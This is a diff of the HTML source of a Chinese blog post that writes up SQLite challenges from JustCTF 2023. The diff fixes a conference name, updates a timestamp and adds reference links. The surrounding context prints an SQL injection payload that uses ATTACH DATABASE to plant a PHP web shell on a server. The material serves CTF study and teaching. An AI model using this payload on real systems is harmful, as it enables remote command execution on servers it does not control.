@@ -12,7 +12,7 @@
 <meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">
 <meta property="og:locale">
 <meta property="article:published_time" content="2023-06-04T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-06-05T06:44:48.089Z">
+<meta property="article:modified_time" content="2023-06-05T07:02:09.883Z">
 <meta property="article:author" content="Swing">
 <meta property="article:tag" content="JustCTF">
 <meta property="article:tag" content="sqlite">
@@ -163,7 +163,7 @@
 
   <div class="content" itemprop="articleBody">
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h1><p>周末简单看了下 JustCTF 2023 的题目， 主要是三个题目吸引了我的注意， 分别是 notabug 、notabug2 和Windytooth。 其中前面两个是和 sqlite3 相关的题目。再次和学到一个了一点利用方式。</p>
-<h3 id="Known-Attacks-on-SQLite"><a href="#Known-Attacks-on-SQLite" class="headerlink" title="Known Attacks on SQLite"></a>Known Attacks on SQLite</h3><p>在DEFCON 2017 长亭科技的 slide 中提到两种众所周知的方法： <a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf">^1</a></p>
+<h3 id="Known-Attacks-on-SQLite"><a href="#Known-Attacks-on-SQLite" class="headerlink" title="Known Attacks on SQLite"></a>Known Attacks on SQLite</h3><p>在BlackHat 2017 长亭科技的 slide 中提到两种众所周知的方法： <a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf">^1</a></p>
 <h4 id="Attach-Database"><a href="#Attach-Database" class="headerlink" title="Attach Database"></a>Attach Database</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;bob&#39;; ATTACH DATABASE &#39;&#x2F;var&#x2F;www&#x2F;lol.php&#39; AS lol; CREATE TABLE lol.pwn </span><br><span class="line">(dataz text); INSERT INTO lol.pwn (dataz) VALUES (&#39;&lt;? system($_GET[&#39;cmd&#39;]); </span><br><span class="line">?&gt;&#39;;--</span><br></pre></td></tr></table></figure>
 
 <p>通过写 <code>ATTACH DATABASE</code> 写文件， 然后执行 php 代码</p>
@@ -199,7 +199,8 @@
 
 
 
-<h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+<h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><p>1 <a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf">Many-Birds-One-Stone</a><br>2 <a href="https://www.sqlite.org/c3ref/load_extension.html">load_extension</a><br>3 <a href="https://blog.csdn.net/liubingzhao/article/details/50885880">SQLite3命令行窗口常用命令</a><br>4 <a href="https://www.sqlite.org/cli.html">The edit() SQL function</a></p>
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
         var options = {
             selector: '.gallery-item'
         };
